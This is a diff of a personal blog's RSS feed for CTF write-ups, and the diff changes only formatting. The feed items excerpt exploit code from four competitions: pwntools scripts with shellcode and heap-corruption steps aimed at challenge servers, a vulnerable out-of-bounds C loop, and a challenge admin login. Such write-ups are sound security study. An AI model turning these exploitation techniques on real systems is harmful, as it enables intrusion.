@@ -4,52 +4,45 @@
     <title>writeup on imssm99 Blog</title>
     <link>https://blog.imssm99.kr/tags/writeup/</link>
     <description>Recent content in writeup on imssm99 Blog</description>
-    <generator>Hugo -- gohugo.io</generator>
+    <generator>Hugo -- 0.121.1</generator>
     <language>en-us</language>
-    <lastBuildDate>Thu, 01 Sep 2022 20:00:00 +0900</lastBuildDate><atom:link href="https://blog.imssm99.kr/tags/writeup/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Thu, 01 Sep 2022 20:00:00 +0900</lastBuildDate>
+    <atom:link href="https://blog.imssm99.kr/tags/writeup/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>2022 Fall GoN Open Qual CTF Writeup</title>
       <link>https://blog.imssm99.kr/ctf/gon_openqual_2022_fall/</link>
       <pubDate>Thu, 01 Sep 2022 20:00:00 +0900</pubDate>
-      
       <guid>https://blog.imssm99.kr/ctf/gon_openqual_2022_fall/</guid>
       <description>2022 Fall Gon Open Qual CTF
 imssm99 (2nd, 11427 pts)
 A. Zero Gravity Vulnerability idx를 입력받을 때 값을 검사하지 않아 OOB가 일어나게 된다. a, r을 통해 임의의 주소에 float 형식으로 값을 더하거나 읽을 수 있다.
 cnt = 1; for ( i = 0; i &amp;lt; cnt; ++i ) { printf(&amp;#34;(r)ead / (a)dd &amp;gt;&amp;gt; &amp;#34;); scanf(&amp;#34;%2s&amp;#34;, &amp;amp;s); if ( (char)s == &amp;#39;a&amp;#39; ) { printf(&amp;#34; idx &amp;gt;&amp;gt; &amp;#34;); scanf(&amp;#34;%d&amp;#34;, &amp;amp;idx); printf(&amp;#34; value &amp;gt;&amp;gt; &amp;#34;); scanf(&amp;#34;%f&amp;#34;, &amp;amp;value); arr[idx] = value + arr[idx]; } else if ( (char)s == &amp;#39;r&amp;#39; ) { printf(&amp;#34; idx &amp;gt;&amp;gt; &amp;#34;); scanf(&amp;#34;%d&amp;#34;, &amp;amp;idx); printf(&amp;#34;%.</description>
     </item>
-    
     <item>
       <title>Google Capture The Flag 2022 Writeup</title>
       <link>https://blog.imssm99.kr/ctf/google_ctf_2022/</link>
       <pubDate>Mon, 01 Aug 2022 20:10:00 +0900</pubDate>
-      
       <guid>https://blog.imssm99.kr/ctf/google_ctf_2022/</guid>
       <description>Team ST4RT, 65th
 Appnote.txt import struct with open(&amp;#34;dump.zip&amp;#34;, &amp;#34;rb&amp;#34;) as f: data = f.read() u16 = lambda x: struct.unpack(&amp;#34;&amp;lt;H&amp;#34;, x)[0] flag = bytearray() eocd = data[0xEEE2:].split(b&amp;#34;PK\x05\x06&amp;#34;) for d in eocd[1:]: offset = u16(d[12:14]) flag.append(data[offset-1]) print(flag) Segfault Labyrinth from pwn import * context.arch = &amp;#34;amd64&amp;#34; #p = process(&amp;#34;./challenge&amp;#34;) p = remote(&amp;#34;segfault-labyrinth.2022.ctfcompetition.com&amp;#34;, 1337) p.recvline() p.sendline(b&amp;#34;0&amp;#34;*8) code = &amp;#34;&amp;#34;&amp;#34; mov rsp, rdi; mov rbp, rdi; add rsp, 0x400; add rbp, 0x400; mov r8, rdi; TASK: xor rbx, rbx; RUN: mov rdi, 2; mov rsi, [r8 + rbx*8]; mov rdx, 0x1; mov rax, 1; syscall; cmp rax, 0xfffffffffffffff2; jne FOUND; inc rbx; cmp rbx, 0x10; jne RUN; FOUND: mov rax, [rsi]; mov r8, rsi; cmp al, 0; je TASK; mov rdx, 0x40; mov rdi, 1; mov rax, 1; syscall; &amp;#34;&amp;#34;&amp;#34; payload = b&amp;#34;&amp;#34; payload += asm(code) p.</description>
     </item>
-    
     <item>
       <title>BCACTF 3.0 Writeup</title>
       <link>https://blog.imssm99.kr/ctf/bcactf_3_0/</link>
       <pubDate>Fri, 10 Jun 2022 20:24:11 +0900</pubDate>
-      
       <guid>https://blog.imssm99.kr/ctf/bcactf_3_0/</guid>
       <description>Team ST4RT, 5th
 Notetaker WASM from pwn import * def run(i): p = remote(&amp;#34;bin.bcactf.com&amp;#34;, 49180) #p = process([&amp;#34;node&amp;#34;, &amp;#34;--experimental-wasi-unstable-preview1&amp;#34;, &amp;#34;runner.js&amp;#34;]) def note_print(idx): p.sendlineafter(b&amp;#34;4)\n&amp;#34;, b&amp;#34;1&amp;#34;) p.sendlineafter(b&amp;#34;inclusive)\n&amp;#34;, str(idx).encode()) def note_delete(idx): p.sendlineafter(b&amp;#34;4)\n&amp;#34;, b&amp;#34;2&amp;#34;) p.sendlineafter(b&amp;#34;inclusive)\n&amp;#34;, str(idx).encode()) def note_create(idx): p.sendlineafter(b&amp;#34;4)\n&amp;#34;, b&amp;#34;3&amp;#34;) p.sendlineafter(b&amp;#34;inclusive)\n&amp;#34;, str(idx).encode()) def note_write(idx, data): p.sendlineafter(b&amp;#34;4)\n&amp;#34;, b&amp;#34;4&amp;#34;) p.sendlineafter(b&amp;#34;inclusive)\n&amp;#34;, str(idx).encode()) p.sendlineafter(b&amp;#34;\n&amp;#34;, data) note_create(1) note_create(2) note_create(3) note_delete(1) # 0x442: %15d -&amp;gt; %lld note_write(1, p32(0x443-0xc) + p32(0x646c6c)) note_delete(2) note_delete(1) calc = lambda fd, bk: ((fd-0x8) &amp;lt;&amp;lt; 32) | bk note_write(1, str(calc(0xc00 + 0x4*6, 0x400+0xc*i)).</description>
     </item>
-    
     <item>
       <title>Codegate2022 Qual Writeup</title>
       <link>https://blog.imssm99.kr/ctf/codegate2022_qual/</link>
       <pubDate>Mon, 28 Mar 2022 14:22:00 +0900</pubDate>
-      
       <guid>https://blog.imssm99.kr/ctf/codegate2022_qual/</guid>
       <description>University Division, imssm99, 3rd (4249 points)
 CAFE bot.py에 admin의 ID/PW가 있어 admin으로 로그인하면 flag를 볼 수 있다.
 driver.get(&amp;#39;http://3.39.55.38:1929/login&amp;#39;) driver.find_element_by_id(&amp;#39;id&amp;#39;).send_keys(&amp;#39;admin&amp;#39;) driver.find_element_by_id(&amp;#39;pw&amp;#39;).send_keys(&amp;#39;$MiLEYEN4&amp;#39;) driver.find_element_by_id(&amp;#39;submit&amp;#39;).click() time.sleep(2) superbee func (this *AdminController) AuthKey() { encrypted_auth_key, _ := AesEncrypt([]byte(auth_key), []byte(auth_crypt_key)) this.Ctx.WriteString(hex.EncodeToString(encrypted_auth_key)) } ... auth_crypt_key, _ = web.AppConfig.String(&amp;#34;auth_crypt_key&amp;#34;) auth_crypt_key가 설정되어있지 않아 빈 문자열이다.
 ... } else if controllerName == &amp;#34;AdminController&amp;#34; { domain := this.Ctx.Input.Domain() if domain != &amp;#34;localhost&amp;#34; { this.Abort(&amp;#34;Not Local&amp;#34;) return } } ... func (this *AdminController) AuthKey() { encrypted_auth_key, _ := AesEncrypt([]byte(auth_key), []byte(auth_crypt_key)) this.</description>
     </item>
-    
   </channel>
 </rss>
